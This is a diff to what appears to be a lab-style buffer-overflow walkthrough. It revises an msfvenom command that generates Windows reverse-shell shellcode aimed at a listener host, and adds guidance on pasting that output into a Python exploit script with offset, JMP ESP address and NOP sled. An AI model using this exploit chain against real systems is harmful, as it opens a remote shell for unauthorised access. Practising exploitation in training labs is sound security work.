@@ -65,9 +65,12 @@ Take the address, use it **little-endian** (e.g. `625011AF` → `\xAF\x11\x50\x6
 ### 5. Generating shellcode with msfvenom
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 \
-  -b "\x00\x0a\x0d" -f c -e x86/shikata_ga_nai EXITFUNC=thread
+  -b "\x00\x0a\x0d" -f py -v shellcode -e x86/shikata_ga_nai EXITFUNC=thread
 ```
-Adjust `-b` to match the confirmed bad-character list.
+Adjust `-b` to match the confirmed bad-character list. **The output format must match the exploit's
+language:** `-f py -v shellcode` emits a Python `shellcode = b"..."` / `shellcode += b"..."` block that
+drops straight into the §6 script below. A `-f c` block (C `unsigned char buf[]="\x.."`) will **not**
+paste into a Python `b""` string — use `-f c` only for a C/C++ exploit.
 
 ### 6. Final exploit script
 ```python
@@ -76,7 +79,7 @@ ip = "10.10.10.X"; port = 9999
 offset = 2003
 eip = b"\xAF\x11\x50\x62"          # JMP ESP address, little-endian
 nops = b"\x90" * 16
-shellcode = b""                     # msfvenom output pasted here
+shellcode = b""                     # REPLACE this line with the `-f py -v shellcode` block from msfvenom
 padding = b"C" * (3000 - offset - len(eip) - len(nops) - len(shellcode))
 buffer = b"A" * offset + eip + nops + shellcode + padding
 
